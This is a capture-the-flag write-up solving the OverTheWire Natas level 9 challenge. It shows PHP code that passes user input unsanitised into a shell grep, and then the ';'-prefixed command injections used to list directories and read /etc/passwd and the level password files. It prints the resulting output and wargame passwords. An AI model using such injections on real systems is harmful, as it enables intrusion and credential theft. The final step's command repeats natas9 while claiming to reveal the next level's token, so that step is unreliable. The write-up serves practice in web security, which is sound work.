## Recap

* You'll get the password in level8. it's `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

## Problem 

Username: natas9
URL:      http://natas9.natas.labs.overthewire.org

* HTML render

![image-20201002043644983](https://i.imgur.com/76v1E66.png)

* PHP source code

```php
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```



## Solution

* That's search what is `_REQUEST`.

  ![image-20201002043857215](https://i.imgur.com/6Okp5PE.png)

  * It means you can pass `needle` throught `$_GET` / `$_POST`. But you can just input in field bacasue of `<input name=needle>`.

* And whats the `passthru`?

  ![image-20201002044014643](https://i.imgur.com/9AKyfDZ.png)

  * You can deem it as `exec`. So website will exec `"grep -i $key dictionary.txt"`,

* First we find http://natas9.natas.labs.overthewire.org/dictionary.txt.

  * However, you can't find something useful.

* Next, we trying to truncate the command and type something we want.

  * Input: `;ls -al`

    ```
    -rw-r----- 1 natas9 natas9 460878 Dec 15  2016 dictionary.txt
    ```

  * Input: `;ls -al ..`

    * (We cannot goto other natas due to each problem has its account and authority.)

    ```
    -rw-r-----  1 natas9 natas9 460878 Dec 15  2016 dictionary.txt
    
    ..:
    total 164
    drwxr-xr-x 41 root    root     4096 May  7 16:12 .
    drwxr-xr-x  3 root    root     4096 Jan 29  2018 ..
    drwxr-xr-x  5 root    root     4096 Oct 25  2018 main
    drwxr-x---  2 natas0  natas0   4096 Dec 20  2016 natas0
    drwxr-x---  2 natas1  natas1   4096 Dec 20  2016 natas1
    drwxr-x---  2 natas10 natas10  4096 Dec 20  2016 natas10
    drwxr-x---  2 natas11 natas11  4096 Dec 20  2016 natas11
    drwxr-x---  3 natas12 natas12  4096 Jul 23  2019 natas12
    drwxr-x---  3 natas13 natas13  4096 Dec 29  2017 natas13
    drwxr-x---  2 natas14 natas14  4096 Dec 20  2016 natas14
    drwxr-x---  2 natas15 natas15  4096 Dec 20  2016 natas15
    drwxr-x---  2 natas16 natas16  4096 Dec 20  2016 natas16
    drwxr-x---  2 natas17 natas17  4096 Dec 20  2016 natas17
    drwxr-x---  2 natas18 natas18  4096 Oct 25  2018 natas18
    drwxr-x---  2 natas19 natas19  4096 Oct 25  2018 natas19
    drwxr-x---  3 natas2  natas2   4096 Dec 20  2016 natas2
    drwxr-x---  2 natas20 natas20  4096 Dec 20  2016 natas20
    drwxr-x---  2 natas21 natas21  4096 Dec 20  2016 natas21
    drwxr-x---  2 natas21 natas21  4096 Dec 20  2016 natas21-experimenter
    drwxr-x---  2 natas22 natas22  4096 Dec 20  2016 natas22
    drwxr-x---  2 natas23 natas23  4096 Dec 20  2016 natas23
    drwxr-x---  2 natas24 natas24  4096 Mar 19  2018 natas24
    drwxr-x---  4 natas25 natas25  4096 Dec 20  2016 natas25
    drwxr-x---  3 natas26 natas26  4096 Dec 20  2016 natas26
    drwxr-x---  2 natas27 natas27  4096 Mar 26  2018 natas27
    drwxr-x---  2 natas28 natas28  4096 May  7 16:12 natas28
    drwxr-x---  2 natas29 natas29  4096 Nov  5  2017 natas29
    drwxr-x---  3 natas3  natas3   4096 Dec 20  2016 natas3
    drwxr-x---  2 natas30 natas30  4096 Oct 29  2018 natas30
    drwxr-x---  4 natas31 natas31  4096 Dec 15  2016 natas31
    drwxr-x---  4 natas32 natas32  4096 Dec 15  2016 natas32
    drwxr-x---  2 natas33 natas33  4096 Oct 27  2018 natas33
    drwxr-x---  3 natas33 natas33  4096 Sep 27 16:20 natas33-new
    drwxr-x---  2 natas34 natas34  4096 Oct 27  2018 natas34
    drwxr-x---  2 natas4  natas4   4096 Dec 20  2016 natas4
    drwxr-x---  2 natas5  natas5   4096 Dec 20  2016 natas5
    drwxr-x---  3 natas6  natas6   4096 Dec 20  2016 natas6
    drwxr-x---  2 natas7  natas7   4096 Dec 20  2016 natas7
    drwxr-x---  2 natas8  natas8   4096 Dec 20  2016 natas8
    drwxr-x---  2 natas9  natas9   4096 Dec 20  2016 natas9
    drwxr-x---  4 root    www-data 4096 Dec 20  2016 stats
    ```

  * Input: `;ls -al /`

    * ```
      -rw-r-----  1 natas9 natas9 460878 Dec 15  2016 dictionary.txt
      
      /:
      total 88
      drwxr-xr-x  23 root root  4096 Oct 27  2018 .
      drwxr-xr-x  23 root root  4096 Oct 27  2018 ..
      drwxrwxr-x   2 root root  4096 Jun  6  2017 bin
      dr-x------   3 root root  4096 Jan 29  2018 boot
      drwxr-xr-x  15 root root  3560 May  4 17:07 dev
      drwxr-xr-x  92 root root  4096 May  7 16:12 etc
      drwxr-xr-x  38 root root  4096 May  7 16:12 home
      lrwxrwxrwx   1 root root    31 Jan 29  2018 initrd.img -> /boot/initrd.img-3.16.0-5-amd64
      lrwxrwxrwx   1 root root    31 Nov 22  2016 initrd.img.old -> /boot/initrd.img-3.16.0-4-amd64
      drwxr-xr-x  15 root root  4096 Jan 29  2018 lib
      drwxr-xr-x   2 root root  4096 Jan 29  2018 lib64
      drwx------   2 root root 16384 Nov 22  2016 lost+found
      drwxr-xr-x   3 root root  4096 Nov 22  2016 media
      drwxr-xr-x   2 root root  4096 Nov 22  2016 mnt
      drwxr-xr-x   3 root root  4096 Oct 27  2018 natas33
      drwxr-xr-x   4 root root  4096 Feb 21  2018 opt
      dr-xr-xr-x 158 root root     0 May  4 17:07 proc
      drwx------  11 root root  4096 Aug 10 19:16 root
      drwxr-xr-x  17 root root   600 May  5 06:25 run
      drwxr-xr-x   2 root root  4096 Mar 12  2018 sbin
      drwxr-xr-x   2 root root  4096 Nov 22  2016 srv
      dr-xr-xr-x  11 root root     0 May  4 22:15 sys
      drwx------   3 root root  4096 Oct  1 17:03 tmp
      drwxr-xr-x  10 root root  4096 Nov 22  2016 usr
      drwxr-xr-x  12 root root  4096 Dec  6  2016 var
      lrwxrwxrwx   1 root root    27 Jan 29  2018 vmlinuz -> boot/vmlinuz-3.16.0-5-amd64
      lrwxrwxrwx   1 root root    27 Nov 22  2016 vmlinuz.old -> boot/vmlinuz-3.16.0-4-amd64
      ```

  * You can even get passwd. `;cat /etc/passwd`

    * ```
      root:x:0:0:root:/root:/bin/bash
      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
      bin:x:2:2:bin:/bin:/usr/sbin/nologin
      sys:x:3:3:sys:/dev:/usr/sbin/nologin
      sync:x:4:65534:sync:/bin:/bin/sync
      games:x:5:60:games:/usr/games:/usr/sbin/nologin
      man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
      lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
      mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
      news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
      uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
      proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
      www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
      backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
      list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
      irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
      gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
      nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
      systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
      systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
      systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
      systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
      Debian-exim:x:104:109::/var/spool/exim4:/bin/false
      messagebus:x:105:110::/var/run/dbus:/bin/false
      statd:x:106:65534::/var/lib/nfs:/bin/false
      sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin
      morla:x:1000:1000:morla,,,:/home/morla:/bin/bash
      ntp:x:108:113::/home/ntp:/bin/false
      mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false
      natas31:x:30031:30031:natas level 31:/home/natas31:/bin/bash
      natas32:x:30032:30032:natas level 32:/home/natas32:/bin/bash
      natas0:x:30000:30000:natas level 0:/home/natas0:/bin/bash
      natas1:x:30001:30001:natas level 1:/home/natas1:/bin/bash
      natas2:x:30002:30002:natas level 2:/home/natas2:/bin/bash
      natas3:x:30003:30003:natas level 3:/home/natas3:/bin/bash
      natas4:x:30004:30004:natas level 4:/home/natas4:/bin/bash
      natas5:x:30005:30005:natas level 5:/home/natas5:/bin/bash
      natas6:x:30006:30006:natas level 6:/home/natas6:/bin/bash
      natas7:x:30007:30007:natas level 7:/home/natas7:/bin/bash
      natas8:x:30008:30008:natas level 8:/home/natas8:/bin/bash
      natas9:x:30009:30009:natas level 9:/home/natas9:/bin/bash
      natas10:x:30010:30010:natas level 10:/home/natas10:/bin/bash
      natas11:x:30011:30011:natas level 11:/home/natas11:/bin/bash
      natas14:x:30014:30014:natas level 14:/home/natas14:/bin/bash
      natas15:x:30015:30015:natas level 15:/home/natas15:/bin/bash
      natas16:x:30016:30016:natas level 16:/home/natas16:/bin/bash
      natas17:x:30017:30017:natas level 17:/home/natas17:/bin/bash
      natas20:x:30020:30020:natas level 20:/home/natas20:/bin/bash
      natas21:x:30021:30021:natas level 21:/home/natas21:/bin/bash
      natas22:x:30022:30022:natas level 22:/home/natas22:/bin/bash
      natas23:x:30023:30023:natas level 23:/home/natas23:/bin/bash
      natas25:x:30025:30025:natas level 25:/home/natas25:/bin/bash
      natas26:x:30026:30026:natas level 26:/home/natas26:/bin/bash
      natas29:x:30029:30029:natas level 29:/home/natas29:/bin/bash
      natas13:x:30013:30013:natas level 13:/home/natas13:/bin/bash
      natas24:x:30024:30024:natas level 24:/home/natas24:/bin/bash
      natas27:x:30027:30027:natas level 27:/home/natas27:/bin/bash
      natas18:x:30018:30018:natas level 18:/home/natas18:/bin/bash
      natas19:x:30019:30019:natas level 19:/home/natas19:/bin/bash
      natas34:x:30034:30034:natas level 34:/home/natas34:/bin/bash
      natas33:x:30033:30033:natas level 33:/home/natas33:/bin/bash
      natas30:x:30030:30030:natas level 30:/home/natas30:/bin/bash
      natas12:x:30012:30012:natas level 12:/home/natas12:/bin/bash
      natas28:x:30028:30028:natas level 28:/home/natas28:/bin/bash
      ```

  * Finally, input `;ls -al /etc`

    ```
    /etc/:
    total 840
    drwxr-xr-x 92 root root    4096 May  7 16:12 .
    drwxr-xr-x 23 root root    4096 Oct 27  2018 ..
    -rw-------  1 root root       0 Nov 22  2016 .pwd.lock
    -rw-r--r--  1 root root    4565 Dec  4  2014 Muttrc
    drwxr-xr-x  2 root root    4096 Nov 22  2016 Muttrc.d
    drwxr-xr-x  4 root root    4096 Nov 22  2016 X11
    drwxr-xr-x  3 root root    4096 Nov 22  2016 acpi
    -rw-r--r--  1 root root    2981 Nov 22  2016 adduser.conf
    -rw-r--r--  1 root root      44 Nov 30  2016 adjtime
    -rw-r--r--  1 root root     197 Nov 22  2016 aliases
    drwxr-xr-x  2 root root    4096 Mar 15  2017 alternatives
    drwxr-xr-x  8 root root    4096 Jul 23  2019 apache2
    drwxr-xr-x  3 root root    4096 Jan 29  2018 apparmor.d
    drwxr-xr-x  6 root root    4096 Dec 15  2016 apt
    -rw-r-----  1 root daemon   144 Sep 30  2014 at.deny
    -rw-r--r--  1 root root    1897 Dec 17  2016 bash.bashrc
    -rw-r--r--  1 root root      45 Mar 22  2014 bash_completion
    drwxr-xr-x  2 root root    4096 Jan 29  2018 bash_completion.d
    -rw-r--r--  1 root root     367 Aug 13  2016 bindresvport.blacklist
    drwxr-xr-x  2 root root    4096 Sep  2  2016 binfmt.d
    drwxr-xr-x  3 root root    4096 Nov 22  2016 ca-certificates
    -rw-r--r--  1 root root    8226 Mar 15  2017 ca-certificates.conf
    -rw-r--r--  1 root root    7820 Nov 22  2016 ca-certificates.conf.dpkg-old
    drwxr-xr-x  2 root root    4096 Nov 22  2016 calendar
    drwxr-xr-x  2 root root    4096 Nov 22  2016 console-setup
    drwxr-xr-x  2 root root    4096 Oct 27  2018 cron.d
    drwxr-xr-x  2 root root    4096 Jan 29  2018 cron.daily
    drwxr-xr-x  2 root root    4096 Nov 22  2016 cron.hourly
    drwxr-xr-x  2 root root    4096 Nov 22  2016 cron.monthly
    drwxr-xr-x  2 root root    4096 Nov 22  2016 cron.weekly
    -rw-r--r--  1 root root     722 Jun 11  2015 crontab
    drwxr-xr-x  4 root root    4096 Mar 15  2017 dbus-1
    -rw-r--r--  1 root root    2969 Mar 18  2015 debconf.conf
    -rw-r--r--  1 root root       5 Nov 19  2017 debian_version
    drwxr-xr-x  2 root root    4096 Feb 19  2018 default
    -rw-r--r--  1 root root     604 May 15  2012 deluser.conf
    drwxr-xr-x  4 root root    4096 Mar 12  2018 dhcp
    drwxr-xr-x  2 root root    4096 Nov 22  2016 dictionaries-common
    -rw-r--r--  1 root root     346 Sep  1  2014 discover-modprobe.conf
    drwxr-xr-x  2 root root    4096 Nov 22  2016 discover.conf.d
    drwxr-xr-x  4 root root    4096 Nov 22  2016 dpkg
    drwxr-xr-x  3 root root    4096 Nov 22  2016 emacs
    -rw-r--r--  1 root root     312 Jul 25  2016 email-addresses
    -rw-r--r--  1 root root       0 Nov 22  2016 environment
    drwxr-xr-x  3 root root    4096 Nov 22  2016 exim4
    drwxr-xr-x  4 root root    4096 Nov 22  2016 fonts
    -rw-r--r--  1 root root     868 Dec 17  2016 fstab
    -rw-r--r--  1 root root    2584 Feb  7  2014 gai.conf
    drwxr-xr-x  2 root root    4096 Nov 22  2016 groff
    -rw-r--r--  1 root root    1481 May  7 16:12 group
    -rw-------  1 root root    1464 May  7 16:12 group-
    drwxr-xr-x  2 root root    4096 Nov 22  2016 grub.d
    -rw-r-----  1 root shadow  1162 May  7 16:12 gshadow
    -rw-------  1 root root    1150 May  7 16:12 gshadow-
    drwxr-xr-x  3 root root    4096 Nov 22  2016 gss
    drwxr-xr-x  2 root root    4096 Jan 29  2018 gtk-2.0
    -rw-r--r--  1 root root       9 Aug  7  2006 host.conf
    -rw-r--r--  1 root root       6 Nov 30  2016 hostname
    -rw-r--r--  1 root root     300 Nov 15  2017 hosts
    -rw-r--r--  1 root root     411 Nov 22  2016 hosts.allow
    -rw-r--r--  1 root root     711 Nov 22  2016 hosts.deny
    -rw-r--r--  1 root root     206 Aug 12  2014 idmapd.conf
    drwxr-xr-x  2 root root    4096 Jan 29  2018 init
    drwxr-xr-x  2 root root    4096 Oct 27  2018 init.d
    drwxr-xr-x  5 root root    4096 Jun  6  2017 initramfs-tools
    -rw-r--r--  1 root root    1748 Aug  3  2014 inputrc
    drwxr-xr-x  3 root root    4096 Nov 22  2016 insserv
    -rw-r--r--  1 root root     859 Nov 23  2012 insserv.conf
    drwxr-xr-x  2 root root    4096 Nov 23  2016 insserv.conf.d
    drwxr-xr-x  2 root root    4096 Nov 22  2016 iproute2
    drwxr-xr-x  2 root root    4096 Dec 17  2016 iptables
    -rw-r--r--  1 root root    2853 Feb 21  2018 iptables.rules
    drwxr-xr-x  2 root root    4096 Nov 22  2016 iscsi
    -rw-r--r--  1 root root      26 Sep 12  2016 issue
    -rw-r--r--  1 root root      91 Dec 17  2016 issue.net
    drwxr-xr-x  2 root root    4096 Nov 22  2016 kbd
    drwxr-xr-x  4 root root    4096 Nov 22  2016 kernel
    -rw-r--r--  1 root root     144 Nov 22  2016 kernel-img.conf
    -rw-r--r--  1 root root   25411 Oct 19  2018 ld.so.cache
    -rw-r--r--  1 root root      34 Aug 13  2016 ld.so.conf
    drwxr-xr-x  2 root root    4096 Jan 29  2018 ld.so.conf.d
    drwxr-xr-x  2 root root    4096 Jun  6  2017 ldap
    -rw-r--r--  1 root root     191 Sep  7  2014 libaudit.conf
    drwxr-xr-x  2 root root    4096 Nov  1  2014 libpaper.d
    -rw-r--r--  1 root root    2492 Sep  3  2016 locale.alias
    -rw-r--r--  1 root root    9017 Jan 29  2018 locale.gen
    -rw-r--r--  1 root root    3519 Feb 19  2018 localtime
    drwxr-xr-x  5 root root    4096 Dec  4  2016 logcheck
    -rw-r--r--  1 root root   10478 Nov 18  2015 login.defs
    -rw-r--r--  1 root root     599 Feb 19  2009 logrotate.conf
    drwxr-xr-x  2 root root    4096 Feb 19  2018 logrotate.d
    -rw-r--r--  1 root root   14867 Jan  3  2014 ltrace.conf
    -r--r--r--  1 root root      33 Nov 22  2016 machine-id
    -rw-r--r--  1 root root     111 Jun 18  2016 magic
    -rw-r--r--  1 root root     111 Jun 18  2016 magic.mime
    -rw-r--r--  1 root root     125 Mar 15  2015 mail.rc
    -rw-r--r--  1 root root    3207 Jan 29  2018 mailcap
    -rw-r--r--  1 root root     449 Dec 28  2014 mailcap.order
    -rw-r--r--  1 root root       9 Nov 22  2016 mailname
    -rw-r--r--  1 root root    5173 Dec 31  2014 manpath.config
    -rw-r--r--  1 root root   24146 Dec 28  2014 mime.types
    -rw-r--r--  1 root root     956 Jun 10  2016 mke2fs.conf
    drwxr-xr-x  2 root root    4096 Jun  6  2017 modprobe.d
    -rw-r--r--  1 root root     195 Nov 22  2016 modules
    drwxr-xr-x  2 root root    4096 Jun  6  2017 modules-load.d
    -rw-r--r--  1 root root    2975 Nov 12  2017 motd
    lrwxrwxrwx  1 root root      12 Nov 22  2016 mtab -> /proc/mounts
    drwxr-xr-x  3 root root    4096 Jan 29  2018 mysql
    -rw-r--r--  1 root root    8453 Jul 16  2014 nanorc
    d---------  2 root root    4096 May  7 16:12 natas_pass
    drwx------  2 root root    4096 Oct 25  2018 natas_session_toucher
    drwxr-xr-x  2 root root    4096 May  7 16:12 natas_webpass
    -rw-r--r--  1 root root     767 Sep  8  2014 netconfig
    drwxr-xr-x  7 root root    4096 Nov 30  2016 network
    -rw-r--r--  1 root root      82 Nov 22  2016 networks
    drwxr-xr-x  2 root root    4096 Nov 22  2016 newt
    -rw-r--r--  1 root root     497 May  4  2014 nsswitch.conf
    -rw-r--r--  1 root root     881 Dec  3  2016 ntp.conf
    drwxr-xr-x  2 root root    4096 Nov 22  2016 opt
    lrwxrwxrwx  1 root root      21 Nov 19  2017 os-release -> ../usr/lib/os-release
    -rw-r--r--  1 root root     552 Jan  6  2016 pam.conf
    drwxr-xr-x  2 root root    4096 Jan 29  2018 pam.d
    -rw-r--r--  1 root root       7 Nov 22  2016 papersize
    -rw-r--r--  1 root root    3634 May  7 16:12 passwd
    -rw-------  1 root root    3573 May  7 16:12 passwd-
    drwxr-xr-x  5 root root    4096 Jan 29  2018 perl
    drwxr-xr-x  5 root root    4096 Dec  6  2016 php5
    drwxr-xr-x  3 root root    4096 Nov 22  2016 ppp
    -rw-r--r--  1 root root     761 Oct 22  2014 profile
    drwxr-xr-x  2 root root    4096 Feb 19  2018 profile.d
    -rw-r--r--  1 root root    2932 Oct 20  2014 protocols
    drwxr-xr-x  6 root root    4096 Dec  2  2016 puppetlabs
    drwxr-xr-x  2 root root    4096 Nov 22  2016 python
    drwxr-xr-x  2 root root    4096 Nov 22  2016 python2.7
    -rwxr-xr-x  1 root root     364 Mar  1  2019 rc.local
    drwxr-xr-x  2 root root    4096 Feb 21  2018 rc0.d
    drwxr-xr-x  2 root root    4096 Feb 21  2018 rc1.d
    drwxr-xr-x  2 root root    4096 Feb 21  2018 rc2.d
    drwxr-xr-x  2 root root    4096 Feb 21  2018 rc3.d
    drwxr-xr-x  2 root root    4096 Feb 21  2018 rc4.d
    drwxr-xr-x  2 root root    4096 Feb 21  2018 rc5.d
    drwxr-xr-x  2 root root    4096 Feb 21  2018 rc6.d
    drwxr-xr-x  2 root root    4096 Oct 20  2018 rcS.d
    -rw-r--r--  1 root root    3173 Jan  4  2015 reportbug.conf
    drwxr-xr-x  2 root root    4096 Nov 22  2016 request-key.d
    -rw-r--r--  1 root root      19 Nov 22  2016 resolv.conf
    -rwxr-xr-x  1 root root     268 Nov  8  2014 rmt
    -rw-r--r--  1 root root     887 Oct 20  2014 rpc
    -rw-r--r--  1 root root    2632 Dec 14  2015 rsyslog.conf
    drwxr-xr-x  2 root root    4096 Feb 21  2018 rsyslog.d
    -rw-r--r--  1 root root    3663 Jul 26  2014 screenrc
    -rw-r--r--  1 root root    4038 Nov 18  2015 securetty
    drwxr-xr-x  4 root root    4096 Jan 29  2018 security
    drwxr-xr-x  2 root root    4096 Nov 22  2016 selinux
    -rw-r--r--  1 root root   19605 Oct 20  2014 services
    drwxr-xr-x  2 root root    4096 Nov 22  2016 sgml
    -rw-r-----  1 root shadow  3205 May  7 16:12 shadow
    -rw-------  1 root root    3143 May  7 16:12 shadow-
    -rw-r--r--  1 root root      89 Oct 20  2018 shells
    drwxr-xr-x  2 root root    4096 Mar 15  2017 skel
    drwxr-xr-x  2 root root    4096 Jan 29  2018 ssh
    drwxr-xr-x  4 root root    4096 Jan 29  2018 ssl
    drwxr-xr-x  2 root root    4096 Nov 23  2016 ssmtp
    -rw-r--r--  1 root root     771 Jun  9  2012 staff-group-for-usr-local
    -rw-r--r--  1 root root    1038 May  7 16:12 subgid
    -rw-------  1 root root    1016 May  7 16:12 subgid-
    -rw-r--r--  1 root root    1038 May  7 16:12 subuid
    -rw-------  1 root root    1016 May  7 16:12 subuid-
    -rw-r--r--  1 root root    2084 Mar  6  2015 sysctl.conf
    drwxr-xr-x  2 root root    4096 Jan 29  2018 sysctl.d
    drwxr-xr-x  6 root root    4096 Jun  6  2017 systemd
    drwxr-xr-x  2 root root    4096 Jan 29  2018 terminfo
    drwxr-xr-x  3 root root    4096 Nov 22  2016 texmf
    -rw-r--r--  1 root root      17 Feb 19  2018 timezone
    drwxr-xr-x  2 root root    4096 Sep  2  2016 tmpfiles.d
    -rw-r--r--  1 root root    1260 May 26  2014 ucf.conf
    drwxr-xr-x  4 root root    4096 Jun  6  2017 udev
    drwxr-xr-x  3 root root    4096 Nov 22  2016 ufw
    -rw-r--r--  1 root root     279 Jun 13  2013 updatedb.conf
    drwxr-xr-x  2 root root    4096 Jun  6  2017 vim
    drwxr-xr-x  2 root root    4096 Jan 29  2018 w3m
    -rw-r--r--  1 root root    4812 Jul  5  2016 wgetrc
    drwxr-xr-x  3 root root    4096 Nov 22  2016 xdg
    drwxr-xr-x  2 root root    4096 Nov 22  2016 xml
    ```

  * You'll get something saw before: `natas_webpass` (Input= `;ls -al /etc/natas_webpass`)

    ```
    -rw-r----- 1 natas9 natas9 460878 Dec 15  2016 dictionary.txt
    
    /etc/natas_webpass:
    total 148
    drwxr-xr-x  2 root    root    4096 May  7 16:12 .
    drwxr-xr-x 92 root    root    4096 May  7 16:12 ..
    -r--r-----  1 natas0  natas0     7 Dec 20  2016 natas0
    -r--r-----  1 natas1  natas0    33 Dec 20  2016 natas1
    -r--r-----  1 natas10 natas9    33 Dec 20  2016 natas10
    -r--r-----  1 natas11 natas10   33 Dec 20  2016 natas11
    -r--r-----  1 natas12 natas11   33 Jul 23  2019 natas12
    -r--r-----  1 natas13 natas12   33 Dec 29  2017 natas13
    -r--r-----  1 natas14 natas13   33 Dec 20  2016 natas14
    -r--r-----  1 natas15 natas14   33 Dec 20  2016 natas15
    -r--r-----  1 natas16 natas15   33 Dec 20  2016 natas16
    -r--r-----  1 natas17 natas16   33 Dec 20  2016 natas17
    -r--r-----  1 natas18 natas17   33 Oct 25  2018 natas18
    -r--r-----  1 natas19 natas18   33 Oct 25  2018 natas19
    -r--r-----  1 natas2  natas1    33 Dec 20  2016 natas2
    -r--r-----  1 natas20 natas19   33 Dec 20  2016 natas20
    -r--r-----  1 natas21 natas20   33 Dec 20  2016 natas21
    -r--r-----  1 natas22 natas21   33 Dec 20  2016 natas22
    -r--r-----  1 natas23 natas22   33 Dec 20  2016 natas23
    -r--r-----  1 natas24 natas23   33 Mar 19  2018 natas24
    -r--r-----  1 natas25 natas24   33 Dec 20  2016 natas25
    -r--r-----  1 natas26 natas25   33 Dec 20  2016 natas26
    -r--r-----  1 natas27 natas26   33 Mar 26  2018 natas27
    -r--r-----  1 natas28 natas27   33 May  7 16:12 natas28
    -r--r-----  1 natas29 natas28   33 Dec 20  2016 natas29
    -r--r-----  1 natas3  natas2    33 Dec 20  2016 natas3
    -r--r-----  1 natas30 natas29   33 Oct 29  2018 natas30
    -r--r-----  1 natas31 natas30   33 Dec 15  2016 natas31
    -r--r-----  1 natas32 natas31   33 Dec 15  2016 natas32
    -rw-------  1 root    root      33 Oct 27  2018 natas33
    -r--r-----  1 natas34 natas33   33 Oct 27  2018 natas34
    -r--r-----  1 natas4  natas3    33 Dec 20  2016 natas4
    -r--r-----  1 natas5  natas4    33 Dec 20  2016 natas5
    -r--r-----  1 natas6  natas5    33 Dec 20  2016 natas6
    -r--r-----  1 natas7  natas6    33 Dec 20  2016 natas7
    -r--r-----  1 natas8  natas7    33 Dec 20  2016 natas8
    -r--r-----  1 natas9  natas8    33 Dec 20  2016 natas9
    ```

  * Deep look in our problem `; cat /etc/natas_webpass/natas9`, you'll find the token `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`.

  * Deep look in next problem `; cat /etc/natas_webpass/natas9`, you'll find the token `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`.
  
    * Note that you should use `cat` not `ls`. because `ls -al natas_webpass` shows that it's not a directory.